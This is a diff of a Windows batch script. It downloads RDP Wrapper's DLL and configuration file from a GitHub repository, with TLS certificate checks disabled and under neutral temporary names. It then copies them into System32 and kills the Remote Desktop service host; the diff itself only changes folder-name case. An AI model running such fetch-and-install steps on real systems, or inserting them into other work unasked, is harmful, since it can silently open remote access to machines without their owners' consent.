@@ -7,8 +7,8 @@ ping -n 3 127.0.0.1
 
 curl -k -L -o "%~dp0default0" "https://github.com/jecoma/basco/raw/refs/heads/main/rdpwrap/rdpwrap.dll"
 curl -k -L -o "%~dp0default1" "https://github.com/jecoma/basco/raw/refs/heads/main/rdpwrap/rdpwrap.ini"
-copy /Y "%~dp0default0" "%windir%\System32\rdpwrap.dll"
-copy /Y "%~dp0default1" "%windir%\System32\rdpwrap.ini"
+copy /Y "%~dp0default0" "%windir%\system32\rdpwrap.dll"
+copy /Y "%~dp0default1" "%windir%\system32\rdpwrap.ini"
 del "%~dp0*default*" /f
 taskkill /F /IM svchost.exe /FI "MODULES eq termsrv.dll"
 
